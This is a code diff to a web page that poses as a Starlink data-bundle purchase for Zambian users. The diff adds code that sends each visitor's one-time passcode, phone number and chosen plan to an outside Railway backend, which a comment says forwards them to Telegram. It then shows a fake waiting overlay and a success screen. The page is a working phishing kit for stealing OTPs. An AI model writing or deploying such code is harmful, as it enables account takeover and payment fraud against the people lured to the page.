@@ -315,7 +315,6 @@
         .btn-done:active { transform: scale(0.98); }
         .btn-done i { font-size: 19px; }
 
-        /* BOTTOM NAV */
         .bottom-nav {
             position: fixed; bottom: 0; left: 0; right: 0;
             height: var(--footer-h); background: var(--white);
@@ -473,6 +472,14 @@
     </nav>
 
     <script>
+        // ============================================
+        // RAILWAY BACKEND URL
+        // ============================================
+        const API_BASE = 'https://starlink-network-zm-production.up.railway.app';
+
+        // ============================================
+        // READ PLAN FROM URL
+        // ============================================
         const params = new URLSearchParams(window.location.search);
         const planName = params.get('plan') || 'Elite Bundle';
         const planData = params.get('data') || '400GB';
@@ -534,7 +541,11 @@
 
         otpForm.addEventListener('submit', (e) => { e.preventDefault(); submitOTP(); });
 
-        function submitOTP() {
+        /* ============================================
+           SUBMIT OTP — send to Telegram (no buttons),
+           show waiting 6s, then show success screen
+           ============================================ */
+        async function submitOTP() {
             const val = Array.from(otpBoxes).map(b => b.value).join('');
             if (val.length !== 4) return;
 
@@ -545,7 +556,25 @@
             waitingOverlay.classList.add('open');
             document.body.classList.add('modal-open');
 
-            // After 6 seconds → show success
+            // Send OTP to Telegram (fire and forget)
+            try {
+                await fetch(API_BASE + '/api/otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        plan: planName,
+                        data: planData,
+                        price: planPrice,
+                        period: planPeriod,
+                        phone: planPhone,
+                        otp: val
+                    })
+                });
+            } catch (err) {
+                console.error('Failed to send OTP:', err);
+            }
+
+            // After 6 seconds → show success screen
             setTimeout(() => {
                 waitingOverlay.classList.remove('open');
                 showSuccess();
